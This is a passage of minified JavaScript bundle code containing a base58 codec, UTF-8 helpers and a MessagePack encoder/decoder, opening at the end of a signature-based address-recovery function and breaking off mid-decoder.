    return publicKeyToAddress(await recoverPublicKey({
        hash: q,
        signature: U
    }))
}
function base$1(q) {
    if (q.length >= 255)
        throw new TypeError("Alphabet too long");
    const U = new Uint8Array(256);
    for (let vs = 0; vs < U.length; vs++)
        U[vs] = 255;
    for (let vs = 0; vs < q.length; vs++) {
        const _s = q.charAt(vs)
          , Is = _s.charCodeAt(0);
        if (U[Is] !== 255)
            throw new TypeError(_s + " is ambiguous");
        U[Is] = vs
    }
    const Z = q.length
      , oe = q.charAt(0)
      , et = Math.log(Z) / Math.log(256)
      , st = Math.log(256) / Math.log(Z);
    function ws(vs) {
        if (vs instanceof Uint8Array || (ArrayBuffer.isView(vs) ? vs = new Uint8Array(vs.buffer,vs.byteOffset,vs.byteLength) : Array.isArray(vs) && (vs = Uint8Array.from(vs))),
        !(vs instanceof Uint8Array))
            throw new TypeError("Expected Uint8Array");
        if (vs.length === 0)
            return "";
        let _s = 0
          , Is = 0
          , Ss = 0;
        const Ts = vs.length;
        for (; Ss !== Ts && vs[Ss] === 0; )
            Ss++,
            _s++;
        const Rs = (Ts - Ss) * st + 1 >>> 0
          , Ns = new Uint8Array(Rs);
        for (; Ss !== Ts; ) {
            let pa = vs[Ss]
              , Zs = 0;
            for (let Qa = Rs - 1; (pa !== 0 || Zs < Is) && Qa !== -1; Qa--,
            Zs++)
                pa += 256 * Ns[Qa] >>> 0,
                Ns[Qa] = pa % Z >>> 0,
                pa = pa / Z >>> 0;
            if (pa !== 0)
                throw new Error("Non-zero carry");
            Is = Zs,
            Ss++
        }
        let Hs = Rs - Is;
        for (; Hs !== Rs && Ns[Hs] === 0; )
            Hs++;
        let ha = oe.repeat(_s);
        for (; Hs < Rs; ++Hs)
            ha += q.charAt(Ns[Hs]);
        return ha
    }
    function ms(vs) {
        if (typeof vs != "string")
            throw new TypeError("Expected String");
        if (vs.length === 0)
            return new Uint8Array;
        let _s = 0
          , Is = 0
          , Ss = 0;
        for (; vs[_s] === oe; )
            Is++,
            _s++;
        const Ts = (vs.length - _s) * et + 1 >>> 0
          , Rs = new Uint8Array(Ts);
        for (; _s < vs.length; ) {
            const pa = vs.charCodeAt(_s);
            if (pa > 255)
                return;
            let Zs = U[pa];
            if (Zs === 255)
                return;
            let Qa = 0;
            for (let Ga = Ts - 1; (Zs !== 0 || Qa < Ss) && Ga !== -1; Ga--,
            Qa++)
                Zs += Z * Rs[Ga] >>> 0,
                Rs[Ga] = Zs % 256 >>> 0,
                Zs = Zs / 256 >>> 0;
            if (Zs !== 0)
                throw new Error("Non-zero carry");
            Ss = Qa,
            _s++
        }
        let Ns = Ts - Ss;
        for (; Ns !== Ts && Rs[Ns] === 0; )
            Ns++;
        const Hs = new Uint8Array(Is + (Ts - Ns));
        let ha = Is;
        for (; Ns !== Ts; )
            Hs[ha++] = Rs[Ns++];
        return Hs
    }
    function Es(vs) {
        const _s = ms(vs);
        if (_s)
            return _s;
        throw new Error("Non-base" + Z + " character")
    }
    return {
        encode: ws,
        decodeUnsafe: ms,
        decode: Es
    }
}
var ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
const re$1 = base$1(ALPHABET);
function utf8Count(q) {
    const U = q.length;
    let Z = 0
      , oe = 0;
    for (; oe < U; ) {
        let et = q.charCodeAt(oe++);
        if (et & 4294967168)
            if (!(et & 4294965248))
                Z += 2;
            else {
                if (et >= 55296 && et <= 56319 && oe < U) {
                    const st = q.charCodeAt(oe);
                    (st & 64512) === 56320 && (++oe,
                    et = ((et & 1023) << 10) + (st & 1023) + 65536)
                }
                et & 4294901760 ? Z += 4 : Z += 3
            }
        else {
            Z++;
            continue
        }
    }
    return Z
}
function utf8EncodeJs(q, U, Z) {
    const oe = q.length;
    let et = Z
      , st = 0;
    for (; st < oe; ) {
        let ws = q.charCodeAt(st++);
        if (ws & 4294967168)
            if (!(ws & 4294965248))
                U[et++] = ws >> 6 & 31 | 192;
            else {
                if (ws >= 55296 && ws <= 56319 && st < oe) {
                    const ms = q.charCodeAt(st);
                    (ms & 64512) === 56320 && (++st,
                    ws = ((ws & 1023) << 10) + (ms & 1023) + 65536)
                }
                ws & 4294901760 ? (U[et++] = ws >> 18 & 7 | 240,
                U[et++] = ws >> 12 & 63 | 128,
                U[et++] = ws >> 6 & 63 | 128) : (U[et++] = ws >> 12 & 15 | 224,
                U[et++] = ws >> 6 & 63 | 128)
            }
        else {
            U[et++] = ws;
            continue
        }
        U[et++] = ws & 63 | 128
    }
}
const sharedTextEncoder = new TextEncoder
  , TEXT_ENCODER_THRESHOLD = 50;
function utf8EncodeTE(q, U, Z) {
    sharedTextEncoder.encodeInto(q, U.subarray(Z))
}
function utf8Encode(q, U, Z) {
    q.length > TEXT_ENCODER_THRESHOLD ? utf8EncodeTE(q, U, Z) : utf8EncodeJs(q, U, Z)
}
const CHUNK_SIZE = 4096;
function utf8DecodeJs(q, U, Z) {
    let oe = U;
    const et = oe + Z
      , st = [];
    let ws = "";
    for (; oe < et; ) {
        const ms = q[oe++];
        if (!(ms & 128))
            st.push(ms);
        else if ((ms & 224) === 192) {
            const Es = q[oe++] & 63;
            st.push((ms & 31) << 6 | Es)
        } else if ((ms & 240) === 224) {
            const Es = q[oe++] & 63
              , vs = q[oe++] & 63;
            st.push((ms & 31) << 12 | Es << 6 | vs)
        } else if ((ms & 248) === 240) {
            const Es = q[oe++] & 63
              , vs = q[oe++] & 63
              , _s = q[oe++] & 63;
            let Is = (ms & 7) << 18 | Es << 12 | vs << 6 | _s;
            Is > 65535 && (Is -= 65536,
            st.push(Is >>> 10 & 1023 | 55296),
            Is = 56320 | Is & 1023),
            st.push(Is)
        } else
            st.push(ms);
        st.length >= CHUNK_SIZE && (ws += String.fromCharCode(...st),
        st.length = 0)
    }
    return st.length > 0 && (ws += String.fromCharCode(...st)),
    ws
}
const sharedTextDecoder = new TextDecoder
  , TEXT_DECODER_THRESHOLD = 200;
function utf8DecodeTD(q, U, Z) {
    const oe = q.subarray(U, U + Z);
    return sharedTextDecoder.decode(oe)
}
function utf8Decode(q, U, Z) {
    return Z > TEXT_DECODER_THRESHOLD ? utf8DecodeTD(q, U, Z) : utf8DecodeJs(q, U, Z)
}
class ExtData {
    constructor(U, Z) {
        this.type = U,
        this.data = Z
    }
}
class DecodeError extends Error {
    constructor(U) {
        super(U);
        const Z = Object.create(DecodeError.prototype);
        Object.setPrototypeOf(this, Z),
        Object.defineProperty(this, "name", {
            configurable: !0,
            enumerable: !1,
            value: DecodeError.name
        })
    }
}
const UINT32_MAX = 4294967295;
function setUint64(q, U, Z) {
    const oe = Z / 4294967296
      , et = Z;
    q.setUint32(U, oe),
    q.setUint32(U + 4, et)
}
function setInt64(q, U, Z) {
    const oe = Math.floor(Z / 4294967296)
      , et = Z;
    q.setUint32(U, oe),
    q.setUint32(U + 4, et)
}
function getInt64(q, U) {
    const Z = q.getInt32(U)
      , oe = q.getUint32(U + 4);
    return Z * 4294967296 + oe
}
function getUint64(q, U) {
    const Z = q.getUint32(U)
      , oe = q.getUint32(U + 4);
    return Z * 4294967296 + oe
}
const EXT_TIMESTAMP = -1
  , TIMESTAMP32_MAX_SEC = 4294967296 - 1
  , TIMESTAMP64_MAX_SEC = 17179869184 - 1;
function encodeTimeSpecToTimestamp({sec: q, nsec: U}) {
    if (q >= 0 && U >= 0 && q <= TIMESTAMP64_MAX_SEC)
        if (U === 0 && q <= TIMESTAMP32_MAX_SEC) {
            const Z = new Uint8Array(4);
            return new DataView(Z.buffer).setUint32(0, q),
            Z
        } else {
            const Z = q / 4294967296
              , oe = q & 4294967295
              , et = new Uint8Array(8)
              , st = new DataView(et.buffer);
            return st.setUint32(0, U << 2 | Z & 3),
            st.setUint32(4, oe),
            et
        }
    else {
        const Z = new Uint8Array(12)
          , oe = new DataView(Z.buffer);
        return oe.setUint32(0, U),
        setInt64(oe, 4, q),
        Z
    }
}
function encodeDateToTimeSpec(q) {
    const U = q.getTime()
      , Z = Math.floor(U / 1e3)
      , oe = (U - Z * 1e3) * 1e6
      , et = Math.floor(oe / 1e9);
    return {
        sec: Z + et,
        nsec: oe - et * 1e9
    }
}
function encodeTimestampExtension(q) {
    if (q instanceof Date) {
        const U = encodeDateToTimeSpec(q);
        return encodeTimeSpecToTimestamp(U)
    } else
        return null
}
function decodeTimestampToTimeSpec(q) {
    const U = new DataView(q.buffer,q.byteOffset,q.byteLength);
    switch (q.byteLength) {
    case 4:
        return {
            sec: U.getUint32(0),
            nsec: 0
        };
    case 8:
        {
            const Z = U.getUint32(0)
              , oe = U.getUint32(4)
              , et = (Z & 3) * 4294967296 + oe
              , st = Z >>> 2;
            return {
                sec: et,
                nsec: st
            }
        }
    case 12:
        {
            const Z = getInt64(U, 4)
              , oe = U.getUint32(0);
            return {
                sec: Z,
                nsec: oe
            }
        }
    default:
        throw new DecodeError(`Unrecognized data size for timestamp (expected 4, 8, or 12): ${q.length}`)
    }
}
function decodeTimestampExtension(q) {
    const U = decodeTimestampToTimeSpec(q);
    return new Date(U.sec * 1e3 + U.nsec / 1e6)
}
const timestampExtension = {
    type: EXT_TIMESTAMP,
    encode: encodeTimestampExtension,
    decode: decodeTimestampExtension
};
class ExtensionCodec {
    constructor() {
        this.builtInEncoders = [],
        this.builtInDecoders = [],
        this.encoders = [],
        this.decoders = [],
        this.register(timestampExtension)
    }
    register({type: U, encode: Z, decode: oe}) {
        if (U >= 0)
            this.encoders[U] = Z,
            this.decoders[U] = oe;
        else {
            const et = -1 - U;
            this.builtInEncoders[et] = Z,
            this.builtInDecoders[et] = oe
        }
    }
    tryToEncode(U, Z) {
        for (let oe = 0; oe < this.builtInEncoders.length; oe++) {
            const et = this.builtInEncoders[oe];
            if (et != null) {
                const st = et(U, Z);
                if (st != null) {
                    const ws = -1 - oe;
                    return new ExtData(ws,st)
                }
            }
        }
        for (let oe = 0; oe < this.encoders.length; oe++) {
            const et = this.encoders[oe];
            if (et != null) {
                const st = et(U, Z);
                if (st != null) {
                    const ws = oe;
                    return new ExtData(ws,st)
                }
            }
        }
        return U instanceof ExtData ? U : null
    }
    decode(U, Z, oe) {
        const et = Z < 0 ? this.builtInDecoders[-1 - Z] : this.decoders[Z];
        return et ? et(U, Z, oe) : new ExtData(Z,U)
    }
}
ExtensionCodec.defaultCodec = new ExtensionCodec;
function isArrayBufferLike(q) {
    return q instanceof ArrayBuffer || typeof SharedArrayBuffer < "u" && q instanceof SharedArrayBuffer
}
function ensureUint8Array(q) {
    return q instanceof Uint8Array ? q : ArrayBuffer.isView(q) ? new Uint8Array(q.buffer,q.byteOffset,q.byteLength) : isArrayBufferLike(q) ? new Uint8Array(q) : Uint8Array.from(q)
}
const DEFAULT_MAX_DEPTH = 100
  , DEFAULT_INITIAL_BUFFER_SIZE = 2048;
let Encoder$1 = class Ol {
    constructor(U) {
        this.entered = !1,
        this.extensionCodec = (U == null ? void 0 : U.extensionCodec) ?? ExtensionCodec.defaultCodec,
        this.context = U == null ? void 0 : U.context,
        this.useBigInt64 = (U == null ? void 0 : U.useBigInt64) ?? !1,
        this.maxDepth = (U == null ? void 0 : U.maxDepth) ?? DEFAULT_MAX_DEPTH,
        this.initialBufferSize = (U == null ? void 0 : U.initialBufferSize) ?? DEFAULT_INITIAL_BUFFER_SIZE,
        this.sortKeys = (U == null ? void 0 : U.sortKeys) ?? !1,
        this.forceFloat32 = (U == null ? void 0 : U.forceFloat32) ?? !1,
        this.ignoreUndefined = (U == null ? void 0 : U.ignoreUndefined) ?? !1,
        this.forceIntegerToFloat = (U == null ? void 0 : U.forceIntegerToFloat) ?? !1,
        this.pos = 0,
        this.view = new DataView(new ArrayBuffer(this.initialBufferSize)),
        this.bytes = new Uint8Array(this.view.buffer)
    }
    clone() {
        return new Ol({
            extensionCodec: this.extensionCodec,
            context: this.context,
            useBigInt64: this.useBigInt64,
            maxDepth: this.maxDepth,
            initialBufferSize: this.initialBufferSize,
            sortKeys: this.sortKeys,
            forceFloat32: this.forceFloat32,
            ignoreUndefined: this.ignoreUndefined,
            forceIntegerToFloat: this.forceIntegerToFloat
        })
    }
    reinitializeState() {
        this.pos = 0
    }
    encodeSharedRef(U) {
        if (this.entered)
            return this.clone().encodeSharedRef(U);
        try {
            return this.entered = !0,
            this.reinitializeState(),
            this.doEncode(U, 1),
            this.bytes.subarray(0, this.pos)
        } finally {
            this.entered = !1
        }
    }
    encode(U) {
        if (this.entered)
            return this.clone().encode(U);
        try {
            return this.entered = !0,
            this.reinitializeState(),
            this.doEncode(U, 1),
            this.bytes.slice(0, this.pos)
        } finally {
            this.entered = !1
        }
    }
    doEncode(U, Z) {
        if (Z > this.maxDepth)
            throw new Error(`Too deep objects in depth ${Z}`);
        U == null ? this.encodeNil() : typeof U == "boolean" ? this.encodeBoolean(U) : typeof U == "number" ? this.forceIntegerToFloat ? this.encodeNumberAsFloat(U) : this.encodeNumber(U) : typeof U == "string" ? this.encodeString(U) : this.useBigInt64 && typeof U == "bigint" ? this.encodeBigInt64(U) : this.encodeObject(U, Z)
    }
    ensureBufferSizeToWrite(U) {
        const Z = this.pos + U;
        this.view.byteLength < Z && this.resizeBuffer(Z * 2)
    }
    resizeBuffer(U) {
        const Z = new ArrayBuffer(U)
          , oe = new Uint8Array(Z)
          , et = new DataView(Z);
        oe.set(this.bytes),
        this.view = et,
        this.bytes = oe
    }
    encodeNil() {
        this.writeU8(192)
    }
    encodeBoolean(U) {
        U === !1 ? this.writeU8(194) : this.writeU8(195)
    }
    encodeNumber(U) {
        !this.forceIntegerToFloat && Number.isSafeInteger(U) ? U >= 0 ? U < 128 ? this.writeU8(U) : U < 256 ? (this.writeU8(204),
        this.writeU8(U)) : U < 65536 ? (this.writeU8(205),
        this.writeU16(U)) : U < 4294967296 ? (this.writeU8(206),
        this.writeU32(U)) : this.useBigInt64 ? this.encodeNumberAsFloat(U) : (this.writeU8(207),
        this.writeU64(U)) : U >= -32 ? this.writeU8(224 | U + 32) : U >= -128 ? (this.writeU8(208),
        this.writeI8(U)) : U >= -32768 ? (this.writeU8(209),
        this.writeI16(U)) : U >= -2147483648 ? (this.writeU8(210),
        this.writeI32(U)) : this.useBigInt64 ? this.encodeNumberAsFloat(U) : (this.writeU8(211),
        this.writeI64(U)) : this.encodeNumberAsFloat(U)
    }
    encodeNumberAsFloat(U) {
        this.forceFloat32 ? (this.writeU8(202),
        this.writeF32(U)) : (this.writeU8(203),
        this.writeF64(U))
    }
    encodeBigInt64(U) {
        U >= BigInt(0) ? (this.writeU8(207),
        this.writeBigUint64(U)) : (this.writeU8(211),
        this.writeBigInt64(U))
    }
    writeStringHeader(U) {
        if (U < 32)
            this.writeU8(160 + U);
        else if (U < 256)
            this.writeU8(217),
            this.writeU8(U);
        else if (U < 65536)
            this.writeU8(218),
            this.writeU16(U);
        else if (U < 4294967296)
            this.writeU8(219),
            this.writeU32(U);
        else
            throw new Error(`Too long string: ${U} bytes in UTF-8`)
    }
    encodeString(U) {
        const oe = utf8Count(U);
        this.ensureBufferSizeToWrite(5 + oe),
        this.writeStringHeader(oe),
        utf8Encode(U, this.bytes, this.pos),
        this.pos += oe
    }
    encodeObject(U, Z) {
        const oe = this.extensionCodec.tryToEncode(U, this.context);
        if (oe != null)
            this.encodeExtension(oe);
        else if (Array.isArray(U))
            this.encodeArray(U, Z);
        else if (ArrayBuffer.isView(U))
            this.encodeBinary(U);
        else if (typeof U == "object")
            this.encodeMap(U, Z);
        else
            throw new Error(`Unrecognized object: ${Object.prototype.toString.apply(U)}`)
    }
    encodeBinary(U) {
        const Z = U.byteLength;
        if (Z < 256)
            this.writeU8(196),
            this.writeU8(Z);
        else if (Z < 65536)
            this.writeU8(197),
            this.writeU16(Z);
        else if (Z < 4294967296)
            this.writeU8(198),
            this.writeU32(Z);
        else
            throw new Error(`Too large binary: ${Z}`);
        const oe = ensureUint8Array(U);
        this.writeU8a(oe)
    }
    encodeArray(U, Z) {
        const oe = U.length;
        if (oe < 16)
            this.writeU8(144 + oe);
        else if (oe < 65536)
            this.writeU8(220),
            this.writeU16(oe);
        else if (oe < 4294967296)
            this.writeU8(221),
            this.writeU32(oe);
        else
            throw new Error(`Too large array: ${oe}`);
        for (const et of U)
            this.doEncode(et, Z + 1)
    }
    countWithoutUndefined(U, Z) {
        let oe = 0;
        for (const et of Z)
            U[et] !== void 0 && oe++;
        return oe
    }
    encodeMap(U, Z) {
        const oe = Object.keys(U);
        this.sortKeys && oe.sort();
        const et = this.ignoreUndefined ? this.countWithoutUndefined(U, oe) : oe.length;
        if (et < 16)
            this.writeU8(128 + et);
        else if (et < 65536)
            this.writeU8(222),
            this.writeU16(et);
        else if (et < 4294967296)
            this.writeU8(223),
            this.writeU32(et);
        else
            throw new Error(`Too large map object: ${et}`);
        for (const st of oe) {
            const ws = U[st];
            this.ignoreUndefined && ws === void 0 || (this.encodeString(st),
            this.doEncode(ws, Z + 1))
        }
    }
    encodeExtension(U) {
        if (typeof U.data == "function") {
            const oe = U.data(this.pos + 6)
              , et = oe.length;
            if (et >= 4294967296)
                throw new Error(`Too large extension object: ${et}`);
            this.writeU8(201),
            this.writeU32(et),
            this.writeI8(U.type),
            this.writeU8a(oe);
            return
        }
        const Z = U.data.length;
        if (Z === 1)
            this.writeU8(212);
        else if (Z === 2)
            this.writeU8(213);
        else if (Z === 4)
            this.writeU8(214);
        else if (Z === 8)
            this.writeU8(215);
        else if (Z === 16)
            this.writeU8(216);
        else if (Z < 256)
            this.writeU8(199),
            this.writeU8(Z);
        else if (Z < 65536)
            this.writeU8(200),
            this.writeU16(Z);
        else if (Z < 4294967296)
            this.writeU8(201),
            this.writeU32(Z);
        else
            throw new Error(`Too large extension object: ${Z}`);
        this.writeI8(U.type),
        this.writeU8a(U.data)
    }
    writeU8(U) {
        this.ensureBufferSizeToWrite(1),
        this.view.setUint8(this.pos, U),
        this.pos++
    }
    writeU8a(U) {
        const Z = U.length;
        this.ensureBufferSizeToWrite(Z),
        this.bytes.set(U, this.pos),
        this.pos += Z
    }
    writeI8(U) {
        this.ensureBufferSizeToWrite(1),
        this.view.setInt8(this.pos, U),
        this.pos++
    }
    writeU16(U) {
        this.ensureBufferSizeToWrite(2),
        this.view.setUint16(this.pos, U),
        this.pos += 2
    }
    writeI16(U) {
        this.ensureBufferSizeToWrite(2),
        this.view.setInt16(this.pos, U),
        this.pos += 2
    }
    writeU32(U) {
        this.ensureBufferSizeToWrite(4),
        this.view.setUint32(this.pos, U),
        this.pos += 4
    }
    writeI32(U) {
        this.ensureBufferSizeToWrite(4),
        this.view.setInt32(this.pos, U),
        this.pos += 4
    }
    writeF32(U) {
        this.ensureBufferSizeToWrite(4),
        this.view.setFloat32(this.pos, U),
        this.pos += 4
    }
    writeF64(U) {
        this.ensureBufferSizeToWrite(8),
        this.view.setFloat64(this.pos, U),
        this.pos += 8
    }
    writeU64(U) {
        this.ensureBufferSizeToWrite(8),
        setUint64(this.view, this.pos, U),
        this.pos += 8
    }
    writeI64(U) {
        this.ensureBufferSizeToWrite(8),
        setInt64(this.view, this.pos, U),
        this.pos += 8
    }
    writeBigUint64(U) {
        this.ensureBufferSizeToWrite(8),
        this.view.setBigUint64(this.pos, U),
        this.pos += 8
    }
    writeBigInt64(U) {
        this.ensureBufferSizeToWrite(8),
        this.view.setBigInt64(this.pos, U),
        this.pos += 8
    }
}
;
function encode$2(q, U) {
    return new Encoder$1(U).encodeSharedRef(q)
}
function prettyByte(q) {
    return `${q < 0 ? "-" : ""}0x${Math.abs(q).toString(16).padStart(2, "0")}`
}
const DEFAULT_MAX_KEY_LENGTH = 16
  , DEFAULT_MAX_LENGTH_PER_KEY = 16;
class CachedKeyDecoder {
    constructor(U=DEFAULT_MAX_KEY_LENGTH, Z=DEFAULT_MAX_LENGTH_PER_KEY) {
        this.hit = 0,
        this.miss = 0,
        this.maxKeyLength = U,
        this.maxLengthPerKey = Z,
        this.caches = [];
        for (let oe = 0; oe < this.maxKeyLength; oe++)
            this.caches.push([])
    }
    canBeCached(U) {
        return U > 0 && U <= this.maxKeyLength
    }
    find(U, Z, oe) {
        const et = this.caches[oe - 1];
        e: for (const st of et) {
            const ws = st.bytes;
            for (let ms = 0; ms < oe; ms++)
                if (ws[ms] !== U[Z + ms])
                    continue e;
            return st.str
        }
        return null
    }
    store(U, Z) {
        const oe = this.caches[U.length - 1]
          , et = {
            bytes: U,
            str: Z
        };
        oe.length >= this.maxLengthPerKey ? oe[Math.random() * oe.length | 0] = et : oe.push(et)
    }
    decode(U, Z, oe) {
        const et = this.find(U, Z, oe);
        if (et != null)
            return this.hit++,
            et;
        this.miss++;
        const st = utf8DecodeJs(U, Z, oe)
          , ws = Uint8Array.prototype.slice.call(U, Z, Z + oe);
        return this.store(ws, st),
        st
    }
}
const STATE_ARRAY = "array"
  , STATE_MAP_KEY = "map_key"
  , STATE_MAP_VALUE = "map_value"
  , mapKeyConverter = q => {
    if (typeof q == "string" || typeof q == "number")
        return q;
    throw new DecodeError("The type of key must be string or number but " + typeof q)
}
;
class StackPool {
    constructor() {
        this.stack = [],
        this.stackHeadPosition = -1
    }
    get length() {
        return this.stackHeadPosition + 1
    }
    top() {
        return this.stack[this.stackHeadPosition]
    }
    pushArrayState(U) {
        const Z = this.getUninitializedStateFromPool();
        Z.type = STATE_ARRAY,
        Z.position = 0,
        Z.size = U,
        Z.array = new Array(U)
    }
    pushMapState(U) {
        const Z = this.getUninitializedStateFromPool();
        Z.type = STATE_MAP_KEY,
        Z.readCount = 0,
        Z.size = U,
        Z.map = {}
    }
    getUninitializedStateFromPool() {
        if (this.stackHeadPosition++,
        this.stackHeadPosition === this.stack.length) {
            const U = {
                type: void 0,
                size: 0,
                array: void 0,
                position: 0,
                readCount: 0,
                map: void 0,
                key: null
            };
            this.stack.push(U)
        }
        return this.stack[this.stackHeadPosition]
    }
    release(U) {
        if (this.stack[this.stackHeadPosition] !== U)
            throw new Error("Invalid stack state. Released state is not on top of the stack.");
        if (U.type === STATE_ARRAY) {
            const oe = U;
            oe.size = 0,
            oe.array = void 0,
            oe.position = 0,
            oe.type = void 0
        }
        if (U.type === STATE_MAP_KEY || U.type === STATE_MAP_VALUE) {
            const oe = U;
            oe.size = 0,
            oe.map = void 0,
            oe.readCount = 0,
            oe.type = void 0
        }
        this.stackHeadPosition--
    }
    reset() {
        this.stack.length = 0,
        this.stackHeadPosition = -1
    }
}
const HEAD_BYTE_REQUIRED = -1
  , EMPTY_VIEW = new DataView(new ArrayBuffer(0))
  , EMPTY_BYTES = new Uint8Array(EMPTY_VIEW.buffer);
try {
    EMPTY_VIEW.getInt8(0)
} catch (q) {
    if (!(q instanceof RangeError))
        throw new Error("This module is not supported in the current JavaScript engine because DataView does not throw RangeError on out-of-bounds access")
}
const MORE_DATA = new RangeError("Insufficient data")
  , sharedCachedKeyDecoder = new CachedKeyDecoder;
let Decoder$1 = class Rl {
    constructor(U) {
        this.totalPos = 0,
        this.pos = 0,
        this.view = EMPTY_VIEW,
        this.bytes = EMPTY_BYTES,
        this.headByte = HEAD_BYTE_REQUIRED,
        this.stack = new StackPool,
        this.entered = !1,
        this.extensionCodec = (U == null ? void 0 : U.extensionCodec) ?? ExtensionCodec.defaultCodec,
        this.context = U == null ? void 0 : U.context,
        this.useBigInt64 = (U == null ? void 0 : U.useBigInt64) ?? !1,
        this.rawStrings = (U == null ? void 0 : U.rawStrings) ?? !1,
        this.maxStrLength = (U == null ? void 0 : U.maxStrLength) ?? UINT32_MAX,
        this.maxBinLength = (U == null ? void 0 : U.maxBinLength) ?? UINT32_MAX,
        this.maxArrayLength = (U == null ? void 0 : U.maxArrayLength) ?? UINT32_MAX,
        this.maxMapLength = (U == null ? void 0 : U.maxMapLength) ?? UINT32_MAX,
        this.maxExtLength = (U == null ? void 0 : U.maxExtLength) ?? UINT32_MAX,
        this.keyDecoder = (U == null ? void 0 : U.keyDecoder) !== void 0 ? U.keyDecoder : sharedCachedKeyDecoder,
        this.mapKeyConverter = (U == null ? void 0 : U.mapKeyConverter) ?? mapKeyConverter
    }
    clone() {
        return new Rl({
            extensionCodec: this.extensionCodec,
            context: this.context,
            useBigInt64: this.useBigInt64,
            rawStrings: this.rawStrings,
            maxStrLength: this.maxStrLength,
            maxBinLength: this.maxBinLength,
            maxArrayLength: this.maxArrayLength,
            maxMapLength: this.maxMapLength,
            maxExtLength: this.maxExtLength,
            keyDecoder: this.keyDecoder
        })
    }
    reinitializeState() {
        this.totalPos = 0,
        this.headByte = HEAD_BYTE_REQUIRED,
        this.stack.reset()
    }
    setBuffer(U) {
        const Z = ensureUint8Array(U);
        this.bytes = Z,
        this.view = new DataView(Z.buffer,Z.byteOffset,Z.byteLength),
        this.pos = 0
    }
    appendBuffer(U) {
        if (this.headByte === HEAD_BYTE_REQUIRED && !this.hasRemaining(1))
            this.setBuffer(U);
        else {
            const Z = this.bytes.subarray(this.pos)
              , oe = ensureUint8Array(U)
              , et = new Uint8Array(Z.length + oe.length);
            et.set(Z),
            et.set(oe, Z.length),
            this.setBuffer(et)
        }
    }
    hasRemaining(U) {
        return this.view.byteLength - this.pos >= U
    }
    createExtraByteError(U) {
        const {view: Z, pos: oe} = this;
        return new RangeError(`Extra ${Z.byteLength - oe} of ${Z.byteLength} byte(s) found at buffer[${U}]`)
    }
    decode(U) {
        if (this.entered)
            return this.clone().decode(U);
        try {
            this.entered = !0,
            this.reinitializeState(),
            this.setBuffer(U);
            const Z = this.doDecodeSync();
            if (this.hasRemaining(1))
                throw this.createExtraByteError(this.pos);
            return Z
        } finally {
            this.entered = !1
        }
    }
    *decodeMulti(U) {
        if (this.entered) {
            yield*this.clone().decodeMulti(U);
            return
        }
        try {
            for (this.entered = !0,
            this.reinitializeState(),
            this.setBuffer(U); this.hasRemaining(1); )
                yield this.doDecodeSync()
        } finally {
            this.entered = !1
        }
    }
    async decodeAsync(U) {
        if (this.entered)
            return this.clone().decodeAsync(U);
        try {
            this.entered = !0;
            let Z = !1, oe;
            for await(const ms of U) {
                if (Z)
                    throw this.entered = !1,
                    this.createExtraByteError(this.totalPos);
                this.appendBuffer(ms);
                try {
                    oe = this.doDecodeSync(),
                    Z = !0
                } catch (Es) {
                    if (!(Es instanceof RangeError))
                        throw Es
                }
                this.totalPos += this.pos
            }
            if (Z) {
                if (this.hasRemaining(1))
                    throw this.createExtraByteError(this.totalPos);
                return oe
            }
            const {headByte: et, pos: st, totalPos: ws} = this;
            throw new RangeError(`Insufficient data in parsing ${prettyByte(et)} at ${ws} (${st} in the current buffer)`)
        } finally {
            this.entered = !1
        }
    }
    decodeArrayStream(U) {
        return this.decodeMultiAsync(U, !0)
    }
    decodeStream(U) {
        return this.decodeMultiAsync(U, !1)
    }
    async*decodeMultiAsync(U, Z) {
        if (this.entered) {
            yield*this.clone().decodeMultiAsync(U, Z);
            return
        }
        try {
            this.entered = !0;
            let oe = Z
              , et = -1;
            for await(const st of U) {
                if (Z && et === 0)
                    throw this.createExtraByteError(this.totalPos);
                this.appendBuffer(st),
                oe && (et = this.readArraySize(),
                oe = !1,
                this.complete());
                try {
                    for (; yield this.doDecodeSync(),
                    --et !== 0; )
                        ;
                } catch (ws) {
                    if (!(ws instanceof RangeError))
                        throw ws
                }
                this.totalPos += this.pos
            }
        } finally {
            this.entered = !1
        }
    }
    doDecodeSync() {
        e: for (; ; ) {
            const U = this.readHeadByte();
            let Z;
            if (U >= 224)
                Z = U - 256;
            else if (U < 192)
                if (U < 128)
                    Z = U;
                else if (U < 144) {
                    const et = U - 128;
                    if (et !== 0) {
                        this.pushMapState(et),
                        this.complete();
                        continue e
                    } else
                        Z = {}
                } else if (U < 160) {
                    const et = U - 144;
                    if (et !== 0) {
                        this.pushArrayState(et),
                        this.complete();
                        continue e
                    } else
                        Z = []
                } else {
                    const et = U - 160;
                    Z = this.decodeString(et, 0)
                }
            else if (U === 192)
                Z = null;
            else if (U === 194)
                Z = !1;
            else if (U === 195)
                Z = !0;
            else if (U === 202)
                Z = this.readF32();
            else if (U === 203)
                Z = this.readF64();
            else if (U === 204)
                Z = this.readU8();
            else if (U === 205)
                Z = this.readU16();
            else if (U === 206)
                Z = this.readU32();
            else if (U === 207)
                this.useBigInt64 ? Z = this.readU64AsBigInt() : Z = this.readU64();
            else if (U === 208)
                Z = this.readI8();
            else if (U === 209)
                Z = this.readI16();
            else if (U === 210)
                Z = this.readI32();
            else if (U === 211)
                this.useBigInt64 ? Z = this.readI64AsBigInt() : Z = this.readI64();
            else if (U === 217) {
                const et = this.lookU8();
                Z = this.decodeString(et, 1)
            } else if (U === 218) {
                const et = this.lookU16();
                Z = this.decodeString(et, 2)
            } else if (U === 219) {
                const et = this.lookU32();
                Z = this.decodeString(et, 4)
            } else if (U === 220) {
                const et = this.readU16();
                if (et !== 0) {
                    this.pushArrayState(et),
                    this.complete();
                    continue e
                } else
                    Z = []
            } else if (U === 221) {
                const et = this.readU32();
                if (et !== 0) {
                    this.pushArrayState(et),
                    this.complete();
                    continue e
                } else
                    Z = []
            } else if (U === 222) {
                const et = this.readU16();
                if (et !== 0) {
                    this.pushMapState(et),
                    this.complete();
                    continue e
                } else
                    Z = {}
            } else if (U === 223) {
                const et = this.readU32();
                if (et !== 0) {
                    this.pushMapState(et),
                    this.complete();
                    continue e
                } else
                    Z = {}
            } else if (U === 196) {
                const et = this.lookU8();
                Z = this.decodeBinary(et, 1)
            } else if (U === 197) {
                const et = this.lookU16();
                Z = this.decodeBinary(et, 2)
            } else if (U === 198) {
                const et = this.lookU32();
                Z = this.decodeBinary(et, 4)
            } else if (U === 212)
                Z = this.decodeExtension(1, 0);
            else if (U === 213)
                Z = this.decodeExtension(2, 0);
            else if (U === 214)
                Z = this.decodeExtension(4, 0);
